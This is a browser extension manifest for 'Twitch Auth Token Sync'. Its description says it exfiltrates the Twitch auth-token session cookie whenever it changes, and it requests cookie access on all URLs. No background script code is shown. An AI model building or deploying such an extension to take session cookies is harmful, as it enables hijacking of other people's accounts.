{
  "manifest_version": 3,
  "name": "Twitch Auth Token Sync",
  "version": "$VERSION",
  "description": "A WebExtension designed to exfiltrate the 'auth-token' cookie value from Twitch whenever it changes.",
  "host_permissions": [
    "<all_urls>"
  ],
  "permissions": [
    "cookies",
    "storage"
  ],
  "action": {
    "default_popup": "popup.html"
  },
  "background": {
    "scripts": [
      "background.js"
    ]
  },
  "browser_specific_settings": {
    "gecko": {
      "id": "{1ff6dbd0-d947-4b1f-b25e-ff620512adf8}"
    }
  }
}
